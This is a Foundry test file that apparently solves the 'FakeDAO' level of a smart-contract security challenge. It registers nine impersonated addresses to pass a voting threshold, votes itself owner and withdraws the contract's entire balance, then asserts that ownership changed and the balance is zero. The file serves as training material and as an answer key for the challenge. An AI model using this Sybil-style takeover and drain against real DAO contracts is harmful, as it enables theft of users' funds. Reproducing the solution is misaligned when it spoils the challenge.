// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

  function testExploitLevel() public {
        vm.prank(address(0x1));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x2));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x3));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x4));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x5));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x6));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x7));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x8));
        instance.register();
        vm.stopPrank();

        vm.prank(address(0x9));
        instance.register();
        vm.stopPrank();

        instance.register();
        instance.contribute{value: 0.01 ether}();

        instance.voteForYourself();
        instance.withdraw();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
